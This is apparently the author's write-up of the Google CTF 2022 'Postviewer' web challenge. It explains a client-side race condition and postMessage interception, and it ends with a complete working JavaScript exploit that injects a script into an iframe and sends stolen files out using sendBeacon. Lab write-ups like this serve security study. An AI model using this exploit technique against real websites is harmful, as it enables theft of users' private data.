---
title: "Postviewer - Google Capture The Flag 2022"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "race-condition", "type-juggling", "postviewer", "google-capture-the-flag", "google-capture-the-flag-2022", "2022", "ctf-writeup"]
summary: "The challenge consisted of an all client-side simple page, i.e."
source:
  name: "CTFtime writeup #39218"
  url: "https://ctftime.org/writeup/39218"
original_source: "https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710#file-readme-md"
ctf:
  name: "Google Capture The Flag 2022"
  year: 2022
  challenge: "Postviewer"
---

## Metadata

- **CTF:** Google Capture The Flag 2022
- **Task:** Postviewer
- **Author team:** Google CTF
- **CTFtime:** <https://ctftime.org/writeup/39218>
- **Original writeup:** <https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710#file-readme-md>

---
# Postviewer - writeup

## Challenge's overview  
> The rumor tells that adm1n stores their secret split into multiple documents.  
> Can you catch 'em all?  
> <https://postviewer-web.2022.ctfcompetition.com>

The challenge consisted of an all client-side simple page, i.e. no backend code was involved. A user can upload any file which will be then locally stored in indexedDB. They can preview their files by either clicking on the title or by visiting file's URL, for example <https://postviewer-web.2022.ctfcompetition.com/#file-01d6039e3e157ebcbbf6b2f7cb2dc678f3b9214d>. The preview of the file is rendered inside a blob created from `data:` URL. The rendering occurs by sending file's contents to the iframe via `postMessage({ body, mimeType }, '*')`

Additionally, there is a `/bot` endpoint which lets players send URLs to an `xss-bot` imitating another user. The goal is to steal their documents. 

![](https://user-images.githubusercontent.com/11320896/177049522-b13fa9ed-bd39-499b-b3e1-3b848840f985.png)

## The idea  
There were only two intentional vulnerabilities left in the code:  
1\. User controlled CSS selector passed to `querySelector` via `location.hash` (`const fileDiv = document.querySelector(location.hash);`)  
2\. Unsafe data transfer to an iframe (`iframe.contentWindow?.postMessage({ body, mimeType }, '*');`)

The first vulnerability allows another site to display any file via `#a,.list-group-item:nth-child(${n})` and another to intercept the message and steal admin's files. 

The idea for the challenge comes from an almost-real bug discovered internally.

## Intercepting a message  
### File preview  
Every file goes through [safe-frame.js](#file-safe-frame-js) script which has the following flow:  
1\. Create an iframe with URL `data:text/html,<something>`.  
2\. The iframe redirects itself to a blob URL that registers `onmessage` event.  
3\. After the iframe loads, the parent site sends the file's contents to it, but only once.  
4\. When the iframe receives an `onmessage` event it creates a new blob URL from the message data and redirects itself to that URL. 

In step 2. the iframe is put into a separate process because blob documents created from null origins are isolated for security benefits. This information will be helpful in a later stage of the solution. 

*The practice of using isolated documents is intended to protect against SPECTRE-alike attacks as all documents can attack other documents when in the same process.*

### Race condition  
It's relatively easy to make the website render an attacker-controlled file inside an iframe from another page, let's call it `[evil.com](http://evil.com)`. All the malicious website, `[evil.com](http://evil.com)`, needs to do is to send `win[0].postMessage({body:exploit, mimeType:'text/html'}, '*')` multiple times (`win` is a reference pointing to the challange's website). 

The issue is that to intercept the message, `[evil.com](http://evil.com)` needs to render a malicious site **before** the flag is sent. Even if they manage to do it, the flag is sent almost instantly which is problematic. 

### Slowing down the parent  
As we mentioned earlier, the iframe is process-isolated from its parent. The implication of this is that if the parent process gets busy and becomes unresponsive the iframe will work fine because it's not affected as it is executed by a different process. With that fact, `[evil.com](http://evil.com)` wants to somehow make the challenge website busy but in the meantime render malicious documents inside the iframe. 

It probably can be done in many ways but the technique I used is to send a big chunk of data to the website and make it convert it to string which will take time. I left a simple gadget in the challenge that will do it:

```javascript  
if (e.data == 'blob loaded') {  
$("#previewModal").modal();  
}  
```

Because of loose comparison, if `e.data` is not a string it will be converted to it. In the snippet below, I did exactly that and transferred the whole object in the most efficient way possible with a [transferable object](<https://developer.mozilla.org/en-US/docs/Glossary/Transferable_objects>). 

```javascript  
const buffer = new Uint8Array(1e7);  
//...

win?.postMessage(buffer, '*', [buffer.buffer]);  
```

### Winning the race  
After the iframe is inserted to the challenge page it takes around ~4ms for the document to be sent. That is because the `onload` will only trigger after the document finished loading all subresources and parsed the whole document. It's not a lot of time but enough to solve the challenge. 

1\. Open a new window (`win`) pointing to the challenge website.  
2\. In an infinite loop, check if `win.length === 1` and if so run the attack and stop the loop.  
3\. Slow down the `win` by sending a huge message.   
4\. Wait 500ms (this might need tweaking depending on PC performance) and send the exploit.  
5\. Intercept the message. 

## The complete solution  
By combining the two mentioned vulnerabilities, players were expected to steal 3 admin's files in one run and each file looked like the following:

```  
Congratulations on fetching admin's file!

The flag needs to be deciphered with a password that has been split into three  
random files. Because the password is random with each run, you will have to  
collect all three files. When you do so, just visit:  
<https://postviewer-web.2022.ctfcompetition.com/dec1pher>

File info:  
Cipher: ${flag_cipher}  
Password part [${i}/3]: ${password}

The challenge is easily solvable under 5 seconds, but as a token of appreciation  
I set up a secret endpoint for you that have a limit of 20 seconds:  
<https://postviewer-web.2022.ctfcompetition.com/bot?s=s333cret_b00t_3ndop1nt>  
```

The requirement of stealing all three files was to prevent solutions that were able to only leak one file with multiple attempts. I included my [exploit](#file-exploit-html) at the bottom of the writeup. 

## Closing thoughts  
Process isolation is a security enhancement but can introduce race-condition bugs as showcased in this challenge. Developers must be careful more than ever when writing unsafe JavaScript code. 

The challenge was solved by 10 teams and had easier to find unintended solutions. I will let teams write about them! I expect that most of the solutions achieved different ways of slowing down the process and mostly with many windows which I forgot to block, or with many iframes as I introduced one additional bug in the code. 

```html

<html lang="en">  
<head>  
<meta charset="utf-8" />  
<meta name="viewport" content="width=device-width, initial-scale=1" />  
<title>POC Vulnerable website</title>  
</head>  
<body>  
<h1>Click me!</h1>  
<iframe style="width:1px;height:1px" name="loop"></iframe>  
```

```
<script>  
const URL = '<https://postviewer-web.2022.ctfcompetition.com>';  
const sleep = (d) => new Promise((r) => setTimeout(r, d));  
function notify(...args){  
navigator.sendBeacon('', args);  
console.log(...args);  
}  
async function load(win, url) {  
const buffer = new Uint8Array(1e7);  
win.location = 'about:blank';  
await new Promise((resolve) => {  
loop.onmessage = () => {  
try {  
win.origin;  
resolve();  
} catch (e) {  
loop.postMessage(null);  
}  
};  
loop.postMessage(null);  
});  
win.location = url;  
await new Promise((resolve) => {  
loop.onmessage = () => {  
if (win.length === 1) {  
// Send a huge message so e.data.toString() blocks a thread for a while  
// By transferring only a reference to memory chunk, sending the message  
// will be fast enough to race condition window.onmessage and iframe.onload  
// notify(Date.now(), '==1');  
win?.postMessage(buffer, '*', [buffer.buffer]);  
// Once we know the innerIframe loaded, we can now postMessage to it  
// because it will be rendered in a different process in Chrome, so  
// the blocked parent thread won't affect rendering the iframe!  
setTimeout(() => {  
win[0]?.postMessage(  
{  
body: `LOL! <script>onmessage=async (e)=>{  
let text = await e.data.body.text();  
parent.opener.postMessage({stolen: text}, '*');  
}<\/script>`,  
mimeType: "text/html",  
},  
"*"  
);  
resolve();  
}, 500);  
} else {  
loop.postMessage(null);  
}  
};  
loop.postMessage(null);  
});  
return 1;  
}  
var TIMEOUT = 1500;  
var win;  
function waitForMessage(url) {  
return new Promise(async resolve => {  
onmessage = e => {  
if (e.data.stolen) {  
notify(e.data.stolen);  
log.innerText += e.data.stolen + '\n';  
resolve(false);  
}  
}  
const rnd = 'a' + Math.random().toString(16).slice(2);  
const _url = url + ',' + rnd;  
await load(win, _url);  
setTimeout(() => {  
resolve(true);  
}, TIMEOUT);  
});  
}  
onload = onclick = async () => {  
if (!win || win.closed) {  
win = open('about:blank', 'hack', 'width=800,height=300,top=500');  
}  
for (let i = 1; i < 100; i++) {  
const url = `${URL}/#a,.list-group-item:nth-child(${i})`;  
while (await waitForMessage(url));  
}  
};  
</script>  
</body>  
</html>  
```
